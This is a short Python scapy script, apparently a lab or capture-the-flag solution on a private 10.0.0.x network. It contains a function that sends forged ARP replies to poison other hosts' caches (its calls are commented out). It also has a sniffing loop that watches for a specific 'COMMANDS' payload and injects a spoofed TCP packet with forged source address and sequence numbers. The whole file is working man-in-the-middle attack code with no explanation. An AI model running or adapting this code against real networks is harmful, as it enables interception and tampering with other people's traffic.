from scapy.all import get_if_hwaddr, sniff, send, IP, TCP, sr1, Ether, ARP, sendp, Raw

attacker = get_if_hwaddr('eth0')


def main():
    
    # arp_spoof(attacker, '10.0.0.3')
    # arp_spoof(attacker, '10.0.0.4')
    capture = sniff(filter="tcp", prn=intercept_and_modify, store=0, iface='eth0', count=20)
    print(capture.summary())

    




def arp_spoof(attacker_mac, IP):
    sender =  Ether(src=attacker_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, psrc=IP, hwsrc=attacker_mac)
    sendp(sender, iface='eth0')


def modify_tcp_packet(packet, recp):
    message = b"FLAG"
    response_packet = Ether(src=attacker)/IP(src='10.0.0.4', dst='10.0.0.3')/TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, 
                seq=packet[TCP].ack, ack=(packet.seq + len(recp)), flags='PA')/Raw(load=message)
    print("ok")
    response = sendp(response_packet, iface='eth0')
    print(response)
        



def intercept_and_modify(packet):
    recp = b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n'
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[Raw].load == recp:
        modify_tcp_packet(packet, recp)







    #
    


while (True):
    main()
